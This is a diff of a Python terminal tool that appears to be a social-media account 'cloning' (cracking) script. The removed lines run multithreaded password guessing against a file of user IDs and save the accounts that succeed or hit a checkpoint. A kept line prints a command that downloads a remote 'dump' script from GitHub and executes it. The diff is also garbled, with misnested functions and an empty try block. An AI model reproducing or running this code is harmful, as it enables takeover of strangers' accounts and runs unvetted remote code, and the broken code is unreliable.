@@ -241,86 +241,14 @@ def Main():
 		group()
 	if opt in ["0","0"]:
 		exit()
-		
 		def dump_menu(self):
 		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
+		
 		def file_menu(self):
 		logo()
 		p(" \033[1;92m [•] EXAMPLE /sdcard/filename.txt")
 		file = input("\033[1;97m  [•] PUT FILE PATH : ")
 		try:
-			id = open(file,"r").read().splitlines()
-			self.method_select(id)
-		except FileNotFoundError:
-			p(" [•] File Path Incorrect ")
-			sp(2);self.file_menu()
-		
-	def method_select(self,id):
-		logo()
-		p(" [1] Method 1 ")
-		p(" [2] Mehtod 2 ")
-		p(" [3] Method 3 ")
-		p(" [4] Method 4 " )
-		line()
-		m_opt = input(" [•] Choose : ")
-		if m_opt =='1':
-			method.append("i")
-			self.password_menu(id)
-		elif m_opt =="2":
-			method.append('ii')
-			self.password_menu(id)
-		elif m_opt =="3":
-			method.append('iii')
-			self.password_menu(id)
-		elif m_opt =="4":
-			 method.append('iiii')
-			 self.password_menu(id)
-		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
-
-	def password_menu(self,id):
-		pwx=[]
-		logo()
-		max = 20
-		p(" [•] EXAMPLE 1 , 2 , 3  to 20 Max ")
-		try:
-			plimit = int(input(" [•] PUT LIMIT : "))
-			if plimit =="":
-				plimit = 4
-			elif plimit > max:
-				p(" [•] Password Limit Should up To 20 ");sp(2);self.password_menu()
-		except:
-			plimit = 4
-		logo()
-		p(" [•] Enter Your Passwords like : first last , first123 , last123 etc ")
-		line()
-		for n in range(plimit):
-			pwx.append(input(" [•] PUT PASSWORDS %s : "%(n+1)))
-		logo()
-		p(" \033[1;92m TOTAL FILE ACCOUNTS :\033[1;97m %s "%(str(len(id))))
-		p(" \033[1;92m PROCESS HAS BEEN STARTED \033[1;97m ")
-		line()
-		with tpe(max_workers=30) as saqi:
-			for user in id:
-				uid = user.split("|")[0]
-				nm = user.split("|")[1]
-				if "i" in method:
-					saqi.submit(self.method1,uid,nm,pwx)
-				elif "ii" in method:
-					saqi.submit(self.method2,uid,nm,pwx)
-				elif "iii" in method:
-					saqi.submit(self.method3,uid,nm,pwx)
-				elif "iiii" in method:
-					 saqi.submit(self.method4,uid,nm,pwx)
-		self.saved_results(ok,cp)
-	def saved_results(self,ok,cp):
-		line()
-		p(" [•] Cloning Has been Completed ")
-		p(" [•] Cloning Accounts Saved in /sdcard")
-		p(" [•] Total Ok Accounts : %s "%(len(ok)))
-		p(" [•] Total Cp Accounts : %s "%(len(cp)))
-		line()
-		input(" [•] Press Enter To Go Back ")
-		self.iAmMenu()
 	else:
 		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
 		Main()
